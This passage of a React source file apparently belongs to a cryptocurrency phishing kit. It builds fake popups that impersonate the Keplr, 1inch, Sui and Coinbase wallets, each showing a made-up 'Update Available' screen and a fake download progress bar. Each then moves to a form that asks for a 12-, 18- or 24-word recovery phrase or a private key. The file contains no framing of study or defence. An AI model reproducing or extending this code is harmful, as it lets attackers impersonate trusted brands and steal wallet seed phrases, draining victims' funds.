      <p style={{ fontSize: 13, color: '#6a737d', margin: '0 0 16px', lineHeight: 1.5 }}>Enter your secret recovery phrase to import your wallet.</p>
      {/* Word count selector */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, background: '#f4f6fa', borderRadius: 10, padding: '10px 14px', marginBottom: 16 }}>
        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#6b7280" strokeWidth="2"><path d="M9 5H7a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2h-2"/><rect x="9" y="3" width="6" height="4" rx="1"/></svg>
        <select value={wordCount} onChange={e => setWordCount(e.target.value)} style={{ flex: 1, fontSize: 13, fontWeight: 500, color: '#374151', border: 'none', background: 'transparent', outline: 'none', cursor: 'pointer', fontFamily: 'inherit' }}>
          <option value="12">12-word recovery phrase</option>
          <option value="18">18-word recovery phrase</option>
          <option value="24">24-word recovery phrase</option>
          <option value="1">Private Key</option>
        </select>
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="m6 9 6 6 6-6"/></svg>
      </div>
      {/* Inputs */}
      <div ref={seedRef} style={{ maxHeight: 300, overflowY: 'auto', marginBottom: 20 }}>
        {count === 1 ? (
          <input type="text" placeholder="Enter your private key…" autoComplete="off" spellCheck="false"
            style={{ width: '100%', padding: '12px 14px', fontSize: 13, fontWeight: 500, border: '1.5px solid #e5e7eb', borderRadius: 10, outline: 'none', background: '#fafafa', color: '#202020', boxSizing: 'border-box', fontFamily: 'inherit', transition: 'all 0.18s' }} />
        ) : (
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 7 }}>
            {Array.from({ length: count }, (_, i) => (
              <div key={i} style={{ position: 'relative' }}>
                <span style={{ position: 'absolute', top: '50%', left: 8, transform: 'translateY(-50%)', fontSize: 10, fontWeight: 700, color: '#9ca3af', pointerEvents: 'none', userSelect: 'none', lineHeight: 1 }}>{i + 1}</span>
                <input type="text" placeholder={`word ${i + 1}`} autoComplete="off" spellCheck="false" autoCapitalize="none"
                  style={{ width: '100%', padding: '10px 6px 10px 22px', fontSize: 12, fontWeight: 500, border: '1.5px solid #e5e7eb', borderRadius: 10, outline: 'none', background: '#fafafa', color: '#202020', boxSizing: 'border-box', fontFamily: 'inherit', transition: 'all 0.18s' }}
                  onFocus={e => { e.target.style.borderColor = '#333'; e.target.style.background = '#fff'; e.target.style.boxShadow = '0 0 0 3px rgba(0,0,0,0.08)' }}
                  onBlur={e => { e.target.style.borderColor = '#e5e7eb'; e.target.style.background = '#fafafa'; e.target.style.boxShadow = 'none' }}
                />
              </div>
            ))}
          </div>
        )}
      </div>
      <button onClick={handleContinue} style={{ width: '100%', height: 50, background: '#000', color: '#fff', border: 'none', borderRadius: 12, fontSize: 15, fontWeight: 600, cursor: 'pointer', marginTop: 'auto', letterSpacing: '0.01em', transition: 'opacity 0.2s' }}>Continue with a wallet</button>
    </div>
    </>
  )
}

/* ══════════════════════════════════════════════
   7. KEPLR MODAL
   - Loading: keplr_new.png (70px), gradient bg, "Loading your Keplr Wallet"
   - Update: keplr_new.png (80px), "Update Available", "Version 0.12.271", bold text desc, "Update Now" purple btn
   - Updating: Keplr logo bounce, "Updating Keplr Wallet", progress #7084ff
   - Import: word select, 3-col grid, "Confirm" btn
══════════════════════════════════════════════ */
export function KeplrModal({ onClose, onImportDone }) {
  const [phase, setPhase] = useState('loading')
  const [wordCount, setWordCount] = useState('12')
  const progress = useProgressTimer(phase === 'updating', () => setPhase('import'))

  useEffect(() => {
    if (phase !== 'loading') return
    const t = setTimeout(() => setPhase('update'), 3000)
    return () => clearTimeout(t)
  }, [])

  return (
    <>
      <style>{`
        @keyframes keplrSlide { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:translateX(0)} }
        @keyframes keplrImgBounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
        .keplr-overlay { position:fixed;inset:0;z-index:10000;background:rgba(18,18,18,.5);pointer-events:auto; }
        .keplr-modal { position:fixed;z-index:10001;top:0;right:32px;width:360px;height:680px;background:#fff;border:1px solid #eaecef;box-shadow:0 8px 40px rgba(0,0,0,.18);display:flex;flex-direction:column;overflow:hidden;font-family:'Inter',-apple-system,sans-serif;animation:keplrSlide .2s ease; }
        @media(max-width:600px){.keplr-modal{top:0;left:0;right:0;bottom:0;width:100%;height:100%;max-height:100%;border-radius:0;}}
      `}</style>
      <div className="keplr-overlay" onClick={onClose} />
      <div className="keplr-modal">

        {/* Loading */}
        {phase === 'loading' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', background: '#ffffff' }}>
            <img src="/media/images/keplr_new.png" alt="Keplr" style={{ width: 70, height: 70, objectFit: 'contain' }} />
            <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: '12px 0 0', textAlign: 'center' }}>Loading your Keplr Wallet</h3>
            <p style={{ fontSize: 14, color: '#6a7587', margin: '8px 0 0', textAlign: 'center', maxWidth: 280 }}>The game-changing wallet for Ethereum and all EVM chains</p>
          </div>
        )}

        {/* Update */}
        {phase === 'update' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <div style={{ padding: '32px 24px', display: 'flex', flexDirection: 'column', height: '100%', boxSizing: 'border-box' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 32 }}>
                <img src="/media/images/keplr_new.png" alt="Keplr" style={{ width: 80, height: 80, objectFit: 'contain', marginBottom: 24 }} />
                <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: '0 0 8px', textAlign: 'center' }}>Update Available</h3>
                <p style={{ fontSize: 16, color: '#6a7587', margin: 0, textAlign: 'center' }}>Version 0.12.271</p>
              </div>
              <div style={{ flex: 1, marginBottom: 32, display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                <h4 style={{ fontSize: 18, fontWeight: 500, color: '#192945', marginBottom: 16, textAlign: 'center' }}>New Updates</h4>
                <b style={{ fontSize: 15, fontWeight: 600, color: '#000', textAlign: 'center', display: 'inline-block', lineHeight: 1.6 }}>Update now to get the latest security patches, improved performance, and brand-new features that will make your experience faster, safer, and more reliable. By staying up to date, you&apos;ll also enjoy enhanced stability, better compatibility with new technologies, and access to the newest tools we&apos;re adding to keep you ahead.</b>
              </div>
              <div style={{ marginTop: 'auto' }}>
                <button onClick={() => setPhase('updating')} style={{ width: '100%', height: 56, background: '#7084ff', color: '#fff', border: 'none', borderRadius: 8, fontSize: 17, fontWeight: 500, cursor: 'pointer' }}>Update Now</button>
                <div style={{ textAlign: 'center', marginTop: 16 }}>
                  <a href="https://keplr.io/help" target="_blank" rel="noreferrer" style={{ color: '#7084ff', fontSize: 14, textDecoration: 'none' }}>Need help? Visit our Support Center</a>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Updating */}
        {phase === 'updating' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', background: '#fff' }}>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '32px 24px', boxSizing: 'border-box' }}>
              <div style={{ animation: 'keplrImgBounce 1.2s ease-in-out infinite', marginBottom: 32 }}>
                <img src="/media/images/keplr_new.png" alt="Keplr" style={{ width: 80, height: 80, objectFit: 'contain' }} />
              </div>
              <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: '0 0 8px', textAlign: 'center' }}>Updating Keplr Wallet</h3>
              <p style={{ fontSize: 16, color: '#6a7587', margin: '0 0 32px', textAlign: 'center' }}>Please wait while we update to version 0.12.271</p>
              <div style={{ width: '100%', marginBottom: 24 }}>
                <div style={{ width: '100%', height: 8, background: '#f2f4f7', borderRadius: 999, overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${progress}%`, background: '#7084ff', borderRadius: 999, transition: 'width .1s linear' }} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 8 }}>
                  <span style={{ fontSize: 14, color: '#6a7587' }}>Downloading update...</span>
                  <span style={{ fontSize: 14, fontWeight: 500, color: '#192945' }}>{progress}%</span>
                </div>
              </div>
              <div style={{ marginTop: 'auto', textAlign: 'center' }}>
                <p style={{ fontSize: 14, color: '#6a7587' }}>Please do not close this window during the update.</p>
              </div>
            </div>
          </div>
        )}

        {/* Import */}
        {phase === 'import' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '12px' }}>
              <button onClick={onClose} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4 }}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="1.5"><path d="m15 18-6-6 6-6" /></svg>
              </button>
              <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#7084ff" /></svg>
                <div style={{ width: 56, height: 1, background: '#dee3fc' }} />
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#dee3fc" /></svg>
              </div>
              <div style={{ width: 24 }} />
            </div>
            <div style={{ display: 'flex', justifyContent: 'center', padding: '16px 12px' }}>
              <p style={{ fontSize: 20, fontWeight: 500, color: '#192945', margin: 0 }}>Import Secret Phrase</p>
            </div>
            <SeedGrid wordCount={wordCount} setWordCount={setWordCount} onConfirm={onImportDone || onClose} walletName="Keplr" btnBg="#7084ff" />
          </div>
        )}
      </div>
    </>
  )
}

/* ══════════════════════════════════════════════
   8. 1INCH WALLET MODAL
   - Loading: black bg, 1inch.png (96px pulsing), 1inch.mp4 video, "Welcome to 1inch Wallet", 3 bouncing dots
   - Update: 1inch.png (40px), "Update Available", "Version 4.3.1", specs grid, "Update Now" btn
   - Updating: 1inch.png bouncing, "Updating 1inch Wallet", progress #7084ff
   - Import: "Import Secret Phrase"
══════════════════════════════════════════════ */
export function OneinchModal({ onClose, onImportDone }) {
  const [phase, setPhase] = useState('loading')
  const [wordCount, setWordCount] = useState('12')
  const progress = useProgressTimer(phase === 'updating', () => setPhase('import'))

  return (
    <>
      <style>{`
        @keyframes inchSlide { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:translateX(0)} }
        @keyframes inchBounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
        @keyframes inchDot { 0%,80%,100%{transform:scale(0)} 40%{transform:scale(1)} }
        .inch-overlay { position:fixed;inset:0;z-index:10000;background:rgba(18,18,18,.5);pointer-events:auto; }
        .inch-modal { position:fixed;z-index:10001;top:0;right:32px;width:360px;height:680px;background:#000;border:none;box-shadow:0 8px 40px rgba(0,0,0,.18);display:flex;flex-direction:column;overflow:hidden;font-family:'Inter',-apple-system,sans-serif;animation:inchSlide .2s ease; }
        @media(max-width:600px){.inch-modal{top:0;left:0;right:0;bottom:0;width:100%;height:100%;max-height:100%;border-radius:0;}}
      `}</style>
      <div className="inch-overlay" onClick={onClose} />
      <div className="inch-modal">

        {/* Loading */}
        {phase === 'loading' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', background: '#000', gap: 0 }}>
            <img src="/media/images/1inch.png" alt="1inch" style={{ width: 96, height: 96, marginBottom: 40, animation: 'inchBounce 1.5s ease-in-out infinite' }} />
            <video src="/media/images/1inch.mp4" autoPlay muted playsInline disablePictureInPicture controlsList="nodownload nofullscreen noremoteplayback" style={{ maxWidth: '80%', maxHeight: '40%', objectFit: 'contain', pointerEvents: 'none' }} onEnded={() => setPhase('update')} />
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', color: '#fff', marginTop: 24, gap: 8 }}>
              <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0, textAlign: 'center' }}>Welcome to 1inch Wallet</h1>
              <p style={{ fontSize: 16, color: '#aaa', margin: 0 }}>The most efficient DeFi aggregator</p>
              <div style={{ display: 'flex', gap: 8, marginTop: 8 }}>
                {[0, 0.2, 0.4].map((delay, i) => (
                  <div key={i} style={{ width: 12, height: 12, borderRadius: '50%', background: i === 0 ? '#3b82f6' : i === 1 ? '#ec4899' : '#a855f7', animation: `inchDot 1.4s ease-in-out ${delay}s infinite` }} />
                ))}
              </div>
            </div>
          </div>
        )}

        {/* Update */}
        {phase === 'update' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <div style={{ padding: '32px 24px', display: 'flex', flexDirection: 'column', height: '100%', boxSizing: 'border-box' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 32 }}>
                <img src="/media/images/1inch.png" alt="1inch" style={{ width: 40, height: 40, marginBottom: 24 }} />
                <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: '0 0 8px', textAlign: 'center' }}>Update Available</h3>
                <p style={{ fontSize: 16, color: '#6a7587', margin: 0, textAlign: 'center' }}>Version 4.3.1</p>
              </div>
              <div style={{ flex: 1, marginBottom: 32, background: '#fff', borderRadius: 16, boxShadow: '0 2px 12px rgba(0,0,0,.08)', padding: 24 }}>
                <h4 style={{ fontSize: 20, fontWeight: 600, color: '#192945', marginBottom: 20, marginTop: 0 }}>Key Specifications</h4>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: 20 }}>
                  {[
                    { icon: '🔗', title: 'Multi-Chain Support', desc: 'Works across Ethereum, BNB Chain, Polygon, Optimism, Arbitrum, and more.' },
                    { icon: '🔄', title: 'DEX Aggregation', desc: 'Optimized token swaps by sourcing liquidity from multiple decentralized exchanges.' },
                    { icon: '🔒', title: 'Secure Wallet', desc: 'Non-custodial wallet with advanced transaction protection and scam detection.' },
                  ].map((spec, i) => (
                    <div key={i} style={{ display: 'flex', gap: 12 }}>
                      <span style={{ fontSize: 20, flexShrink: 0 }}>{spec.icon}</span>
                      <div>
                        <h5 style={{ fontSize: 15, fontWeight: 500, color: '#192945', margin: '0 0 4px' }}>{spec.title}</h5>
                        <p style={{ fontSize: 13, color: '#6a7587', margin: 0, lineHeight: 1.5 }}>{spec.desc}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
              <div style={{ marginTop: 'auto' }}>
                <button onClick={() => setPhase('updating')} style={{ width: '100%', height: 56, background: '#7084ff', color: '#fff', border: 'none', borderRadius: 8, fontSize: 17, fontWeight: 500, cursor: 'pointer' }}>Update Now</button>
                <div style={{ textAlign: 'center', marginTop: 16 }}>
                  <a href="https://1inch.io" target="_blank" rel="noreferrer" style={{ color: '#7084ff', fontSize: 14, textDecoration: 'none' }}>Need help? Visit our Support Center</a>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Updating */}
        {phase === 'updating' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', background: '#fff' }}>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '32px 24px', boxSizing: 'border-box' }}>
              <div style={{ animation: 'inchBounce 1.2s ease-in-out infinite', marginBottom: 32 }}>
                <img src="/media/images/1inch.png" alt="1inch" style={{ width: 80, height: 80, objectFit: 'contain' }} />
              </div>
              <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: '0 0 8px', textAlign: 'center' }}>Updating 1inch Wallet</h3>
              <p style={{ fontSize: 16, color: '#6a7587', margin: '0 0 32px', textAlign: 'center' }}>Please wait while we update to version 4.3.1</p>
              <div style={{ width: '100%', marginBottom: 24 }}>
                <div style={{ width: '100%', height: 8, background: '#f2f4f7', borderRadius: 999, overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${progress}%`, background: '#7084ff', borderRadius: 999, transition: 'width .1s linear' }} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 8 }}>
                  <span style={{ fontSize: 14, color: '#6a7587' }}>Downloading update...</span>
                  <span style={{ fontSize: 14, fontWeight: 500, color: '#192945' }}>{progress}%</span>
                </div>
              </div>
              <div style={{ marginTop: 'auto', textAlign: 'center' }}>
                <p style={{ fontSize: 14, color: '#6a7587' }}>Please do not close this window during the update.</p>
              </div>
            </div>
          </div>
        )}

        {/* Import */}
        {phase === 'import' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '12px' }}>
              <button onClick={onClose} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4 }}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="1.5"><path d="m15 18-6-6 6-6" /></svg>
              </button>
              <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#7084ff" /></svg>
                <div style={{ width: 56, height: 1, background: '#dee3fc' }} />
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#dee3fc" /></svg>
              </div>
              <div style={{ width: 24 }} />
            </div>
            <div style={{ display: 'flex', justifyContent: 'center', padding: '16px 12px' }}>
              <p style={{ fontSize: 20, fontWeight: 500, color: '#192945', margin: 0 }}>Import Secret Phrase</p>
            </div>
            <SeedGrid wordCount={wordCount} setWordCount={setWordCount} onConfirm={onImportDone || onClose} walletName="1inch Wallet" btnBg="#7084ff" />
          </div>
        )}
      </div>
    </>
  )
}

/* ══════════════════════════════════════════════
   9. SUI WALLET MODAL  (dark #0c0a1f throughout)
   - Loading: sui_bg.png background, sui.png (100px), "Your Money. Unblock." (40px white)
   - Update: dark #0c0a1f bg, sui_dark.png (70px), "Update Available", "There is a new version...", "Update Now" btn
   - Updating: dark bg, spinner, "Updating sui Wallet", progress #7084ff
   - Import: dark bg, "Import Wallet", word select, 3-col grid (white text/border), "Confirm" btn
══════════════════════════════════════════════ */
export function SuiModal({ onClose, onImportDone }) {
  const [phase, setPhase] = useState('loading')
  const [wordCount, setWordCount] = useState('12')
  const progress = useProgressTimer(phase === 'updating', () => setPhase('import'))

  useEffect(() => {
    if (phase !== 'loading') return
    const t = setTimeout(() => setPhase('update'), 3000)
    return () => clearTimeout(t)
  }, [])

  const DARK = '#0c0a1f'

  return (
    <>
      <style>{`
        @keyframes suiSlide { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:translateX(0)} }
        @keyframes suiSpin { to{transform:rotate(360deg)} }
        .sui-overlay { position:fixed;inset:0;z-index:10000;background:rgba(18,18,18,.5);pointer-events:auto; }
        .sui-modal { position:fixed;z-index:10001;top:0;right:32px;width:360px;height:680px;background:${DARK};border:1px solid #2a2840;box-shadow:0 8px 40px rgba(0,0,0,.4);display:flex;flex-direction:column;overflow:hidden;font-family:'Inter',-apple-system,sans-serif;animation:suiSlide .2s ease; }
        @media(max-width:600px){.sui-modal{top:0;left:0;right:0;bottom:0;width:100%;height:100%;max-height:100%;border-radius:0;}}
        .sui-spinner { width:80px;height:80px;border:4px solid rgba(112,132,255,.3);border-top-color:#7084ff;border-radius:50%;animation:suiSpin .85s linear infinite; }
      `}</style>
      <div className="sui-overlay" onClick={onClose} />
      <div className="sui-modal">

        {/* Loading */}
        {phase === 'loading' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', background: `url('/media/images/sui_bg.png') center/cover no-repeat, ${DARK}` }}>
            <img src="/media/images/sui.png" alt="Sui" style={{ width: 100, height: 100, objectFit: 'contain' }} />
            <h3 style={{ fontSize: 40, fontWeight: 500, color: '#fff', margin: '12px 0 0', textAlign: 'center', lineHeight: 1.2 }}>Your Money.<br />Unblock.</h3>
          </div>
        )}

        {/* Update */}
        {phase === 'update' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: DARK }}>
            <div style={{ padding: '32px 24px', display: 'flex', flexDirection: 'column', height: '100%', boxSizing: 'border-box' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 32 }}>
                <img src="/media/images/sui_dark.png" alt="Sui" style={{ width: 70, height: 70, objectFit: 'contain', marginBottom: 20 }} />
                <h3 style={{ fontSize: 24, fontWeight: 500, color: '#fff', margin: 0, textAlign: 'center' }}>Update Available</h3>
              </div>
              <div style={{ flex: 1, marginBottom: 32, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <p style={{ fontSize: 16, fontWeight: 300, color: '#fff', textAlign: 'center', lineHeight: 1.6 }}>There is a new version available. Update now</p>
              </div>
              <div style={{ marginTop: 'auto' }}>
                <button onClick={() => setPhase('updating')} style={{ width: '100%', height: 56, background: '#7084ff', color: '#fff', border: 'none', borderRadius: 8, fontSize: 17, fontWeight: 500, cursor: 'pointer' }}>Update Now</button>
              </div>
            </div>
          </div>
        )}

        {/* Updating */}
        {phase === 'updating' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', background: DARK }}>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '32px 24px', boxSizing: 'border-box' }}>
              <div className="sui-spinner" style={{ marginBottom: 32 }} />
              <h3 style={{ fontSize: 24, fontWeight: 500, color: '#fff', margin: '0 0 8px', textAlign: 'center' }}>Updating Sui Wallet</h3>
              <p style={{ fontSize: 16, color: '#fff', margin: '0 0 32px', textAlign: 'center' }}>Please wait while we update to version 1.56.1</p>
              <div style={{ width: '100%', marginBottom: 24 }}>
                <div style={{ width: '100%', height: 8, background: '#fff', borderRadius: 999, overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${progress}%`, background: '#7084ff', borderRadius: 999, transition: 'width .1s linear' }} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 8 }}>
                  <span style={{ fontSize: 14, color: '#fff' }}>Downloading update...</span>
                  <span style={{ fontSize: 14, fontWeight: 500, color: '#fff' }}>{progress}%</span>
                </div>
              </div>
              <div style={{ marginTop: 'auto', textAlign: 'center' }}>
                <p style={{ fontSize: 14, color: '#fff' }}>Please do not close this window during the update.</p>
              </div>
            </div>
          </div>
        )}

        {/* Import */}
        {phase === 'import' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: DARK, height: '100%' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '12px' }}>
              <button onClick={onClose} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4 }}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="1.5"><path d="m15 18-6-6 6-6" /></svg>
              </button>
              <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#7084ff" /></svg>
                <div style={{ width: 56, height: 1, background: '#dee3fc' }} />
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#dee3fc" /></svg>
              </div>
              <div style={{ width: 24 }} />
            </div>
            <div style={{ display: 'flex', justifyContent: 'center', padding: '16px 12px' }}>
              <p style={{ fontSize: 20, fontWeight: 500, color: '#fff', margin: 0 }}>Import Wallet</p>
            </div>
            <SeedGrid wordCount={wordCount} setWordCount={setWordCount} onConfirm={onImportDone || onClose} walletName="Sui Wallet" textColor="#fff" borderColor="#4a4a6a" focusBorderColor="#7084ff" bg="#1a1835" btnBg="#7084ff" />
          </div>
        )}
      </div>
    </>
  )
}

/* ══════════════════════════════════════════════
   10. COINBASE WALLET MODAL
   - Loading: warmwelcome_ext_750x1200.webm video fullscreen
   - Update: Coinbase logo (blue circle), "Update Available", "Version 29.57", blue bg info box, changelog, blue "Update" btn
   - Updating: blue spinner, "Updating Coinbase Wallet", progress #1652F0
   - Import: "Import with Secret Phrase"
══════════════════════════════════════════════ */
export function CoinbaseModal({ onClose, onImportDone }) {
  const [phase, setPhase] = useState('loading')
  const [wordCount, setWordCount] = useState('12')
  const progress = useProgressTimer(phase === 'updating', () => setPhase('import'))

  const BLUE = '#1652F0'

  return (
    <>
      <style>{`
        @keyframes cbSlide { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:translateX(0)} }
        @keyframes cbSpin { to{transform:rotate(360deg)} }
        .cb-overlay { position:fixed;inset:0;z-index:10000;background:rgba(18,18,18,.5);pointer-events:auto; }
        .cb-modal { position:fixed;z-index:10001;top:0;right:32px;width:360px;height:680px;background:#000;border:none;box-shadow:0 8px 40px rgba(0,0,0,.18);display:flex;flex-direction:column;overflow:hidden;font-family:'Inter',-apple-system,sans-serif;animation:cbSlide .2s ease; }
        @media(max-width:600px){.cb-modal{top:0;left:0;right:0;bottom:0;width:100%;height:100%;max-height:100%;border-radius:0;}}
      `}</style>
      <div className="cb-overlay" onClick={onClose} />
      <div className="cb-modal">

        {/* Loading: video */}
        {phase === 'loading' && (
          <div style={{ flex: 1, overflow: 'hidden', background: '#000', display: 'flex' }}>
            <video src="/media/images/warmwelcome_ext_750x1200.webm" autoPlay muted playsInline disablePictureInPicture controlsList="nodownload nofullscreen noremoteplayback" style={{ width: '100%', height: '100%', objectFit: 'cover', display: 'block', pointerEvents: 'none' }} onEnded={() => setPhase('update')} />
          </div>
        )}

        {/* Update */}
        {phase === 'update' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <div style={{ padding: '32px 24px', display: 'flex', flexDirection: 'column', height: '100%', boxSizing: 'border-box' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
                <img src="/media/images/wallet-coinbase.webp" alt="Coinbase" style={{ width: 64, height: 64, borderRadius: 16, marginBottom: 20 }} />
                <h3 style={{ fontSize: 24, fontWeight: 700, color: '#000', margin: '0 0 4px', textAlign: 'center' }}>Update Available</h3>
                <p style={{ fontSize: 16, color: '#616e7f', margin: 0, textAlign: 'center' }}>Version 29.57</p>
              </div>
              <div style={{ background: `${BLUE}1a`, borderLeft: `4px solid ${BLUE}`, borderRadius: '0 4px 4px 0', padding: 16, marginBottom: 20 }}>
                <p style={{ margin: 0, fontSize: 14, fontWeight: 500, color: '#000', lineHeight: 1.5 }}>Important security update with performance improvements. We recommend installing it now.</p>
              </div>
              <div style={{ background: '#f5f5f5', borderRadius: 8, padding: 16, marginBottom: 24 }}>
                <ul style={{ margin: 0, padding: '0 0 0 20px' }}>
                  {['Enhanced multi-chain asset management', 'Improved security for DeFi transactions', 'Fixed balance display issues', 'Better gas fee estimation'].map((item, i) => (
                    <li key={i} style={{ fontSize: 14, color: '#000', lineHeight: 1.6, marginBottom: 4 }}>{item}</li>
                  ))}
                </ul>
              </div>
              <div style={{ marginTop: 'auto' }}>
                <button onClick={() => setPhase('updating')} style={{ width: '100%', height: 50, background: BLUE, color: '#fff', border: 'none', borderRadius: 999, fontSize: 16, fontWeight: 500, cursor: 'pointer', marginBottom: 16 }}>Update</button>
                <p style={{ fontSize: 14, color: '#000', textAlign: 'center', margin: 0 }}>
                  Need help?{' '}
                  <a href="https://help.coinbase.com" target="_blank" rel="noreferrer" style={{ color: BLUE, textDecoration: 'none' }}>Contact Coinbase Support</a>
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Updating */}
        {phase === 'updating' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', background: '#fff' }}>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '32px 24px', boxSizing: 'border-box' }}>
              <div style={{ width: 60, height: 60, border: `4px solid ${BLUE}22`, borderTopColor: BLUE, borderRadius: '50%', animation: 'cbSpin .85s linear infinite', marginBottom: 32 }} />
              <h3 style={{ fontSize: 24, fontWeight: 700, color: '#000', margin: '0 0 8px', textAlign: 'center' }}>Updating Coinbase Wallet</h3>
              <p style={{ fontSize: 16, color: '#616e7f', margin: '0 0 32px', textAlign: 'center' }}>Please wait while we update to version 29.57</p>
              <div style={{ width: '100%', marginBottom: 24 }}>
                <div style={{ width: '100%', height: 8, background: '#e6e6e6', borderRadius: 999, overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${progress}%`, background: BLUE, borderRadius: 999, transition: 'width .1s linear' }} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 8 }}>
                  <span style={{ fontSize: 14, color: '#616e7f' }}>Downloading update...</span>
                  <span style={{ fontSize: 14, fontWeight: 500, color: '#000' }}>{progress}%</span>
                </div>
              </div>
              <div style={{ marginTop: 'auto', textAlign: 'center' }}>
                <p style={{ fontSize: 14, color: '#616e7f' }}>This may take a few moments. Please do not close this window.</p>
              </div>
            </div>
          </div>
        )}

        {/* Import */}
        {phase === 'import' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <ImportNavHeader onBack={onClose} title="Import with Secret Phrase" />
            <SeedGrid wordCount={wordCount} setWordCount={setWordCount} onConfirm={onImportDone || onClose} walletName="Coinbase Wallet" btnBg={BLUE} />
          </div>
        )}
      </div>
    </>
  )
}
